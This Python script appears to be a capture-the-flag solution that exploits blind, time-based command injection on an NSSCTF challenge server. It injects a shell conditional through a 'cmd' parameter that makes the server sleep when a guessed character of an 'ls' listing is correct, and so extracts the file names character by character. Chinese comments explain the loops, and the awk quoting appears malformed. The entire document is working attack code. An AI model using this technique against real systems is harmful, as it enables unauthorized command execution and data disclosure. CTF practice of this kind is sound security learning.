import requests
import time

url = "http://node5.anna.nssctf.cn:25608/?file="
result = ""

for i in range(1,5):    # 定义i、j、k三个变量
    for j in range(1,10):
        for k in range(32,128):   # 把ascii码转换成字母，HEX编码变成字符
            k=chr(k)
            time.sleep(0.1)       # i定义读取1-5行，j定义读取1-55个字符
            payload = "?cmd=" + f"if [ `ls | awk 'NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"
            try:
                requests.get(url=url+payload, timeout=(1.5,1.5))     # 轮番比较字符串，如果正确则执行sleep 2
            except:
                result = result + k
                print(result)
                break
    result += " "